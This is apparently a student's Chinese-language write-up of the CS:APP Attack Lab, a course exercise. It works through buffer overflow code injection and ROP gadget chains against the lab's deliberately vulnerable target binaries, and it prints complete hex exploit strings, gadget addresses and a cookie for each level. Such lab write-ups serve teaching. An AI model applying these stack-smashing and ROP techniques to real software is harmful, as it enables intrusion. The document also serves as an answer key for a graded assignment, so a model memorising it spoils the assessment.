# Attack Lab

## Touch 1

1. getbuf 函数首先执行了 ```sub     $0x38, %rsp```, 也就是BUFFER_SIZE是56
2. touch1 函数地址是 0x4017d2
3. 用 00 填充前56个字节, 最后输入需要跳转的地址 (注意小端模式), 即 d2 17 40 00
4. 所以攻击串为

    ```
    00 00 00 00 00 00 00 00  
    00 00 00 00 00 00 00 00  
    00 00 00 00 00 00 00 00  
    00 00 00 00 00 00 00 00  
    00 00 00 00 00 00 00 00  
    00 00 00 00 00 00 00 00  
    00 00 00 00 00 00 00 00  
    d2 17 40 00 00 00 00 00
    ```

## Touch 2

1. touch2 的起始地址为 0x4017fe
2. 不仅要跳转到 touch2, 还要求传入参数 (cookie: 0x37f6596c)
3. 先把要求的操作写成汇编

    ```text
    mov     $0x37f6596c, %rdi
    pushq   $0x4017fe
    retq
    ```

4. 然后用 objdump 转换为字节码

    ```text
    48 c7 c7 6c 59 f6 37    mov     $0x37f6596c, %rdi
    68 fe 17 40 00          pushq   $0x4017fe
    c3                      retq
    ```

5. 最后追加 %rsp 保存的地址作为返回地址, 用 gdb 断点调试的方法, 得知 %rsp 保存的地址为 0x5560dd08
6. 所以攻击串为

    ```text
    48 c7 c7 6c 59 f6 37 68
    fe 17 40 00 c3 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    08 dd 60 55 00 00 00 00
    ```

## Touch 3

1. touch3 的起始地址为 0x4018d2
2. 要求传入的参数是 cookie 的字符串
3. AscII码对应表
    |'3'|'7'|'f'|'6'|'5'|'9'|'6'|'c'|'\0'|
    |---|---|---|---|---|---|---|---|---|
    |33|37|66|36|35|39|36|63|00|
4. 把这串字符放在返回地址 (%rsp) 的下面, 从 %rsp + 0x40 开始, 保证字符串不在运行中被覆盖
5. 先把操作写成汇编

    ```text
    mov     $0x5560dd48, %rdi
    pushq   $0x4018d2
    retq
    ```
6. 用 objdump 转换为字节码

    ```text
    48 c7 c7 48 dd 60 55    mov     $0x5560dd48,%rdi
    68 d2 18 40 00          pushq   $0x4018d2
    c3                      retq
    ```

7. 最终攻击串为

    ```text
    48 c7 c7 48 dd 60 55 68
    d2 18 40 00 c3 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    08 dd 60 55 00 00 00 00
    33 37 66 36 35 39 36 63 00
    ```

## Touch 2 by ROP

1. 这是我们需要的操作

    ```text
    mov     $0x37f6596c, %rdi
    pushq   $0x4017fe
    retq
    ```

2. 但 farm 中不可能找到一模一样的代码
3. 考虑改写

    ```text
    pushq   $0x37f6596c
    pop     %rdi
    pushq   $0x4017fe
    retq
    ```

4. 在 submitr 函数 (它甚至不在 farm 中) 的最后两行找到

    ```text
    4029df:	41 5f       pop     %r15
    4029e1:	c3          retq
    ```

    从 0x4029e0 开始执行即是

    ```text
    4029e0: 5f          pop     %rdi
    4029e1: c3          retq
    ```

5. 所以攻击串为

    ```text
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    e0 29 40 00 00 00 00 00
    6c 59 f6 37 00 00 00 00
    fe 17 40 00 00 00 00 00
    ```

6. 这样提交能通过测试但是排行榜上只会显示 invalid? 是跳转函数不属于 farm 中的原因吗?
7. 在 farm 中找不到 ```pop      %rdi```, 但是能找到 ```pop  %rax``` 和 ```mov   %rax, %rdi```
8. addval_180 函数

    ```text
    401966:	8d 87 9d 9e 58 90       lea     -0x6fa76163(%rdi), %eax
    40196c:	c3                      retq
    ```

    从 0x40196a 开始执行便是

    ```text
    40196a: 58          pop     %rax
    40196b: 90          nop
    40196c: c3          retq
    ```

9.  getval_447 函数

    ```text
    401960:	b8 48 89 c7 90          mov     $0x90c78948, %eax
    401965:	c3                      retq
    ```

    从 0x401961 开始执行

    ```text
    401961: 48 89 c7        mov    %rax, %rdi
    401964: 90              nop
    401965: c3              retq
    ```

10. 所以最终攻击串为

    ```text
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    6a 19 40 00 00 00 00 00
    6c 59 f6 37 00 00 00 00
    61 19 40 00 00 00 00 00
    fe 17 40 00 00 00 00 00
    ```

11. 终于不是 invalid 了, 但是不在 farm 中的函数就不能使用, 这合理吗?

## Touch 3 by ROP

1. 栈的位置是随机的, 因此必须在代码中找到 %rsp 的值, 然后通过偏移量确定 cookie 的地址
2. 先取得栈顶指针的位置
    setval_405

    ```text
    4019a8:	c7 07 d8 48 89 e0       movl    $0xe08948d8, (%rdi)
    4019ae:	c3                      retq
    ```

    从 0x4019ab 开始执行

    ```text
    4019ab: 48 89 e0    mov    %rsp, %rax
    4019ae: c3          retq
    ```

    getval_447 函数

    ```text
    401960:	b8 48 89 c7 90          mov     $0x90c78948, %eax
    401965:	c3                      retq
    ```

    从 0x401961 开始执行

    ```text
    401961: 48 89 c7        mov    %rax, %rdi
    401964: 90              nop
    401965: c3              retq
    ```

    以上实现了 ```mov   %rsp, %rdi```

3. 取出存在栈中得偏移量的值
    addval_180 函数

    ```text
    401966:	8d 87 9d 9e 58 90       lea     -0x6fa76163(%rdi), %eax
    40196c:	c3                      retq
    ```

    从 0x40196a 开始执行便是

    ```text
    40196a: 58          pop     %rax
    40196b: 90          nop
    40196c: c3          retq
    ```

4. 通过 add_xy 函数得到 cookie 的地址
   1. 准备参数
        addval_456 函数

        ```text
        4019a1: 8d 87 89 c1 38 c0       lea     -0x3fc73e77(%rdi), %eax
        4019a7: c3                      retq
        ```

        从 0x4019a3 开始执行

        ```text
        4019a3: 89 c1       mov     %eax, %ecx
        4019a5: 38 c0       cmp     %al, %al    ; 相当于 nop
        4019a7: c3          retq
        ```

        addval_162 函数

        ```text
        4019c2: 8d 87 89 ca 38 c0       lea    -0x3fc73577(%rdi),%eax
        4019c8: c3                      retq   
        ```

        从 0x4019c4 开始执行

        ```text
        4019c4: 89 ca       mov     %ecx, %edx
        4019c6: 38 c0       cmp     %al, al     ; 相当于 nop
        4019c8: c3          retq
        ```

        addval_426 函数

        ```text
        4019af: 8d 87 89 d6 20 db       lea    -0x24df2977(%rdi),%eax
        4019b5: c3                      retq
        ```

        从 0x4019b1 开始执行

        ```text
        4019b1: 89 d6       mov     %edx, %esi
        4019b3: 20 db       and     %bl, %bl    ; 相当于 nop
        4019b5: c3          retq
        ```

        以上实现了 ```mov   %eax, %esi```
   2. 调用 add_xy
5. 将 cookie 的地址传给 %rdi
    getval_447 函数

    ```text
    401960:	b8 48 89 c7 90          mov     $0x90c78948, %eax
    401965:	c3                      retq
    ```

    从 0x401961 开始执行

    ```text
    401961: 48 89 c7        mov    %rax, %rdi
    401964: 90              nop
    401965: c3              retq
    ```

6. 调用 touch3
7. 攻击串为

    ```text
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    ab 19 40 00 00 00 00 00
    61 19 40 00 00 00 00 00
    6a 19 40 00 00 00 00 00
    48 00 00 00 00 00 00 00
    a3 19 40 00 00 00 00 00
    c4 19 40 00 00 00 00 00
    b1 19 40 00 00 00 00 00
    9c 19 40 00 00 00 00 00
    61 19 40 00 00 00 00 00
    d2 18 40 00 00 00 00 00
    33 37 66 36 35 39 36 63 00
    ```